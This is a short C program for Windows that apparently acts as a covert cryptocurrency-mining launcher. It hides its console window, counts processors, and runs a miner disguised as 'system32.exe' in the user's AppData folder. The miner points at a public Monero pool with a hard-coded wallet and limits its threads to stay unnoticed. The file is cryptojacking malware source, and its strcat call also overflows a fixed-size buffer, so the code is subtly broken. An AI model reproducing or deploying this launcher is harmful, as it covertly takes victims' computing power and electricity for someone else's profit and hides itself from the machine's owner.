#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <windows.h>
#include <math.h>



int main(){
	
    //hide Window

    HWND stealth;
    AllocConsole();
    stealth = FindWindow("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
    

    
    char buffer [1024] = "echo \%number_of_processors\%"; 
    FILE *fp;
    fp = _popen("echo \%number_of_processors\%", "r");
    char container[1024];
    fgets(container, 1024, fp);
    int nbThreads = atoi(container);
    nbThreads/=2;
    if (nbThreads > 2)
        nbThreads = ceil(nbThreads / 2.0);
    char nbThrds[1024];
    sprintf(nbThrds, "%i", nbThreads);
    char cmd[] = "\%userprofile\%\\Appdata\\roaming\\WIN32\\system32.exe -o pool.minexmr.com:4444 -a rx  -u 44bTHyc8z6EDt4mB62bAsBajastTWSwAWFS5DAbNrwGhVsLHE5dbmYHAGcFkw5ZY5LEqNTuLovfzjJxgND53hs4wSNXBFFc -p x --threads=";
    strcat(cmd, nbThrds);
    system(cmd);
    return 0;
}

